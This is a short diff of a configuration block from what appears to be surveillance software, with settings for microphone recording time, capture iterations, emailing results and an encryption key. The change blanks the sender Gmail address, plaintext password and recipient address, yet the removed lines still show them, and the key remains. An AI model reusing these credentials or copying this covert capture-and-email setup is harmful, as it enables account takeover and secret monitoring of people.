@@ -44,10 +44,10 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3        #we will have 3 repitions of 15 seconds each of the features
 
-email_address = "bingearbour@gmail.com"                  #Required for email functionality
-password = "Bingearbour123*"
+email_address = " "                  #Required for email functionality
+password = " "
 
-toaddr= "ankitmathur304@gmail.com"
+toaddr= " "
 
 key = "KJUfjSlszMG1OOnbHH2JmcFvndrURpJqv0GG_ibjJIQ="
 
